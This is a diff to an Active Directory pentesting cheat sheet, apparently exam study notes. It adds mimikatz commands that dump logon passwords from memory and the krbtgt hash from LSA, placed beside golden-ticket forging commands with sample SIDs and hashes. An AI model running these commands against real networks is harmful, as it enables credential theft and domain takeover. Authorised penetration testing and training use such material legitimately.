@@ -7,6 +7,7 @@
 - https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Active%20Directory.md
 - https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/
 - https://blog.certcube.com/kerberoasting-simplified-attack-and-defense/
+- https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
 
 # Table of Content
 - [Active Directory Pentesting](#active-directory-pentesting)
@@ -115,6 +116,11 @@ secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
 ```
 
 ### Password Spraying
+
+- Dump passwords from memory using mimikatz
+```bash
+PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
+```
 
 - Spray with known password on list of found usernames
 ```bash
@@ -225,6 +231,10 @@ Can be used to request any TGS from the Domain Controller
 </aside>
 
 ```bash
+#getting krbtgt (user: krbtgt, NTLM: krbtgt hash)
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch
+
 #using krbtgt hash via mimikatz
 kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
         mimikatz # kerberos :: golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
